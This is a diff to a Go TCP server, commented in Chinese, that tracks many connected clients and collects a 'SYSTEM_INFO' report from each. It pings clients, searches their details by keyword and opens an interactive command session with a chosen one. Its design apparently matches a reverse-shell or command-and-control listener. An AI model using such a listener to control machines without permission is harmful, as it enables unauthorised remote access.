@@ -6,19 +6,21 @@ import (
     "fmt"
     "net"
     "os"
-    "os/signal"
     "strconv"
     "strings"
     "sync"
     "syscall"
+    "os/signal"
     "time"
 )
+
 
 var (
     host     string
     port     int
     help     bool
     clients  = make(map[int]net.Conn)
+    clientInfo = make(map[int]string) // 存储客户端信息
     clientID = 0
     mu       sync.Mutex
     commands = make(map[int][]string) // 命令队列
@@ -52,9 +54,30 @@ func main() {
     fmt.Printf("服务端已启动，监听地址: %s\n", addr)
 
     go acceptConnections(listener)
+    go sendPingToClients()
 
     handleCommands()
 }
+
+func sendPingToClients() {
+    ticker := time.NewTicker(10 * time.Second)
+    defer ticker.Stop()
+
+    for {
+        <-ticker.C
+        mu.Lock()
+        for id, conn := range clients {
+            _, err := fmt.Fprintf(conn, "PING\n")
+            if err != nil {
+                fmt.Printf("客户端 %d (%s) 已断开连接\n> ", id, conn.RemoteAddr())
+                delete(clients, id)
+                delete(clientInfo, id)
+            }
+        }
+        mu.Unlock()
+    }
+}
+
 
 func acceptConnections(listener net.Listener) {
     for {
@@ -69,15 +92,17 @@ func acceptConnections(listener net.Listener) {
         clients[clientID] = conn
         mu.Unlock()
 
-        fmt.Printf("客户端 %d (%s) 已连接\n> ", clientID, conn.RemoteAddr())
+        // 接收客户端信息
+        go receiveClientInfo(clientID, conn)
 
-        go monitorConnection(clientID, conn)
+        fmt.Printf("客户端 %d (%s) 已连接\n> ", clientID, conn.RemoteAddr())
     }
 }
 
-func monitorConnection(id int, conn net.Conn) {
+func receiveClientInfo(id int, conn net.Conn) {
+    reader := bufio.NewReader(conn)
     for {
-        _, err := conn.Write([]byte("PING\n"))
+        info, err := reader.ReadString('\n')
         if err != nil {
             mu.Lock()
             delete(clients, id)
@@ -86,8 +111,35 @@ func monitorConnection(id int, conn net.Conn) {
             fmt.Printf("客户端 %d (%s) 已断开连接\n> ", id, conn.RemoteAddr())
             return
         }
-        time.Sleep(10 * time.Second)
+        if strings.HasPrefix(info, "SYSTEM_INFO: ") {
+            clientInfo[id] = strings.TrimPrefix(info, "SYSTEM_INFO: ")
+            displayClientInfo(id, conn.RemoteAddr().String(), clientInfo[id])
+            return
+        }
     }
+}
+
+func displayClientInfo(id int, addr string, info string) {
+    fmt.Printf("收到客户端 %d 系统信息:\n", id)
+    fmt.Printf("  IP地址和端口: %s\n", addr)
+
+    // 处理多行字符串
+    fields := strings.Split(info, ", ")
+    var currentField string
+    for _, field := range fields {
+        if currentField == "" {
+            currentField = field
+        } else {
+            if strings.Contains(field, ":") {
+                fmt.Printf("  %s\n", currentField)
+                currentField = field
+            } else {
+                currentField += ", " + field
+            }
+        }
+    }
+    fmt.Printf("  %s\n", currentField) // 打印最后一个字段
+    fmt.Print("> ")
 }
 
 func handleCommands() {
@@ -113,6 +165,7 @@ func handleCommands() {
             fmt.Println("已有命令:")
             fmt.Println("  list     - 列出所有连接的客户端")
             fmt.Println("  connect  - 连接到指定客户端 (格式: connect <客户端编号>)")
+            fmt.Println("  search   - 搜索客户端信息 (格式: search <关键字>)")
             fmt.Println("  exit     - 退出服务端")
         } else if command == "list" {
             listClients()
@@ -128,11 +181,20 @@ func handleCommands() {
                 continue
             }
             connectClient(id)
+        } else if strings.HasPrefix(command, "search ") {
+            parts := strings.SplitN(command, " ", 2)
+            if len(parts) != 2 {
+                fmt.Println("命令格式错误，应为: search <关键字>")
+                continue
+            }
+            searchClients(parts[1])
         } else {
             fmt.Println("未知命令")
         }
     }
 }
+
+
 
 func listClients() {
     mu.Lock()
@@ -145,7 +207,7 @@ func listClients() {
 
     fmt.Println("连接的客户端列表:")
     for id, conn := range clients {
-        fmt.Printf("  客户端 %d: %s\n", id, conn.RemoteAddr())
+        fmt.Printf("  客户端 %d: %s, 系统信息: %s\n", id, conn.RemoteAddr(), clientInfo[id])
     }
 }
 
@@ -194,6 +256,34 @@ func connectClient(id int) {
         processCommandQueue(id, writer, connReader, interrupt)
     }
 }
+
+func searchClients(keyword string) {
+    mu.Lock()
+    defer mu.Unlock()
+
+    if len(clients) == 0 {
+        fmt.Println("当前没有连接的客户端")
+        return
+    }
+
+    keyword = strings.ToLower(keyword)
+    found := false
+    for id, info := range clientInfo {
+        if strings.Contains(strings.ToLower(info), keyword) {
+            if !found {
+                fmt.Println("搜索结果:")
+                found = true
+            }
+            displayClientInfo(id, clients[id].RemoteAddr().String(), info)
+        }
+    }
+
+    if !found {
+        fmt.Println("没有找到匹配的客户端信息")
+    }
+}
+
+
 
 func addCommandsToQueue(id int, command string) {
     cmdMutex.Lock()
